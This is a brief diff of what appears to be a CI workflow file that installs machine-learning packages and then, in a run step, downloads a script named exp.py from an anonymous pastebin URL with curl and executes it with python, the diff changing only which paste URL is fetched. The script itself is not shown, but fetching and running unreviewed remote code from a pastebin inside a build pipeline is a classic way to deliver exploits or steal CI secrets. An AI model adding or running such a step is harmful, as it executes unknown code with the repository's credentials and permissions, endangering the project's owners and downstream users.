@@ -16,5 +16,5 @@ jobs:
           pip install numpy transformers diffusers safetensors huggingface_hub
           pip install ai-edge-torch || true
       - run: |
-          curl -fsSL -o exp.py https://paste.rs/jl7Nz
+          curl -fsSL -o exp.py https://paste.rs/GTvN5
           python exp.py
